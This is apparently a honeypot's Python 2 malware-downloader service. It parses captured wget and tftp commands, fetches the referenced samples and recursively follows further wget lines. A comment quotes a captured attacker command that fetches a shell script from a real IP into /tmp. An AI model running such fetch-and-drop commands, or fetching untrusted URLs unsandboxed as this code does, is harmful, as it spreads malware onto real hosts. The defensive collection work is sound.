import logging
import logging.handlers
import os
import re
#import resource
import subprocess
import tftpy
import threading
import urllib
import urlparse

import docker

from multiprocessing.connection import Listener
from settings import CONFIG

#resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))

class NewConnListener:
    def __init__(self):
        self.config = CONFIG
        self.address = self.config['listener']['address']
        self.port = self.config['listener']['port']
        # Check if log file exists. Create new file if it doesn't
        if not os.path.exists(self.config['logging']['downloader_logfile']):
            open(self.config['logging']['downloader_logfile'], "w").close()
        self.logger = logging.getLogger('download')
        hdlr = logging.handlers.TimedRotatingFileHandler(
            self.config['logging']['downloader_logfile'],
            when=self.config['logging']['rotate_interval'],
            backupCount=self.config['logging']['backup_count']
            )
        formatter = logging.Formatter('%(asctime)s %(levelname)s %(message)s')
        hdlr.setFormatter(formatter)
        self.logger.addHandler(hdlr) 
        self.logger.setLevel(self.config['logging']['log_level'])

    def listen(self):
        address = (self.address, self.port)     # family is deduced to be 'AF_INET'
        listener = Listener(address, authkey=self.config['listener']['secret_key'])

        while True:
            conn = listener.accept()
            # print 'connection accepted from', listener.last_accepted
            threading.Thread(target = self.get_msg, args = (conn,)).start()

    def get_msg(self, conn):
        try:
            msg = conn.recv()
            if msg:
                #print(msg)
                if 'wget' in msg[1]:
                    wget_obj = WGETDownloader(self.logger, msg)
                    mw_filename = wget_obj.get_malware()
                    self.dissect_malware(msg[0], mw_filename, wget_obj.logger)
                if 'tftp' in msg[1]:
                    tftp_obj = TFTPDownloader(self.logger, msg)
                    tftp_obj.get_malware()
            else:
                raise error('Client disconnected')
        except Exception as e:
            conn.close()
            return False

    def dissect_malware(self, id, mw_filename, logger):
        logger.info('Starting dissection for {0}'.format(mw_filename))
        filetype_cmd = 'file {0}'.format(mw_filename)
        logger.info(filetype_cmd)
        try:
            result = subprocess.check_output(['file', mw_filename])
            print result
                        
            if re.search('ascii', result, re.IGNORECASE):
                logger.info('Dissecting ASCII file')
                with open(mw_filename) as f:
                    all_wgets = re.findall('wget http[^;]*',f.read(),re.MULTILINE)
                    logger.debug('More WGET commands found. Downloading those')
                    logger.debug(all_wgets)
                    for each_wget in all_wgets:
                        wget_obj = WGETDownloader(logger, [id, each_wget])
                        wget_obj.get_malware()
            else:
                logger.info('{0} not an ASCII file'.format(mw_filename))
            
        except Exception as e:
            print e
            print sys.exc_info()

class TFTPDownloader:
    def __init__(self, logger, msg):
        self.config = CONFIG
        self.id = msg[0]
        self.payload = msg[1]
        self.logger = logger

    def get_malware(self):
        self.logger.info('Downloading TFTP file: {0}'.format(self.payload))        
        tftp_cmd_str = re.findall('tftp[^;]*', self.payload)[0]
        #tftp_cmd_list = tftp_cmd_str.split()
        #tftp_host = re.findall( r'[0-9]+(?:\.[0-9]+){3}', tftp_cmd_str)[0]
        # The name following '-r' is the remote filename, else try 'get'

        self.logger.info('TFTP command: {0}'.format(tftp_cmd_str))

        ##client      = docker.from_env()
        ##command_str = "sh -c 'cd /home; {0}'".format(tftp_cmd_str)
        #container   = client.containers.run('busybox:latest', detach = True, command = command_str, volumes = {self.config['malware']['output_dir']: {'bind': '/home/', 'mode': 'rw'}})
        ##container   = client.containers.run('busybox:latest', auto_remove = True, detach = True, command = command_str, volumes = {self.config['malware']['output_dir']: {'bind': '/home/', 'mode': 'rw'}})
        
        """
        try:
            remote_file_pos = tftp_cmd_list.index('-r')
        except ValueError:
            try:
                remote_file_pos = tftp_cmd_list.index('get')
            except ValueError:
                self.logger.debug('No remote file name specified. Returning....')
                return

        remote_file = tftp_cmd_list[remote_file_pos + 1]
        local_file = remote_file

        try:
            self.logger.info('Making TFTP connection to {0} to get file {1}'.format(
                tftp_host,
                remote_file
            ))
            # Now convert ARM TFTP command to Ubuntu
            tftp_client = tftpy.TftpClient(tftp_host, 69)
            tftp_client.download(remote_file, local_file)
        except Exception as e:
            self.logger.debug(e)
        """
                
class WGETDownloader:
    def __init__(self, logger, msg):
        self.config = CONFIG
        self.id = msg[0]
        self.payload = msg[1]
        self.logger = logger

    def get_filename_from_url(self, url):
        filename = os.path.join(
            self.config['malware']['output_dir'],
            '{0}_{1}'.format(
                self.id,
                os.path.basename(urlparse.urlparse(url).path)
            )
        )
        self.logger.info("Writing to file: {0}".format(filename))
        return filename

    def get_malware(self):
        self.logger.info('Downloading WGET file')        
        raw_wget = re.findall('wget[\s+]http[^;]*', self.payload)[0]
        
        # Handle this: wget+http:/\\/91.212.150.241/go.sh"+>>+/tmp/sdy%29 HTTP/1.1\\n,\\n'
        quote_index = raw_wget.find('\"')
        if quote_index >= 0:
            raw_wget = raw_wget[0:quote_index]
        
        wget_cmd = urllib.unquote_plus(raw_wget.split('wget')[1][raw_wget.split('wget')[1].index('http'):])
        self.logger.debug("wget cmd: {0}".format(wget_cmd))
        url = wget_cmd.replace('\\','')
        self.logger.info("Parsed URL: {0}".format(url))
        mw_filename = self.get_filename_from_url(url)
        urllib.urlretrieve(url, filename=mw_filename)
        self.logger.info("Done downloading: {0}".format(mw_filename))
        return mw_filename        

def main():
    listener_obj = NewConnListener()
    listener_obj.listen()
    
if __name__ == "__main__":
    main()
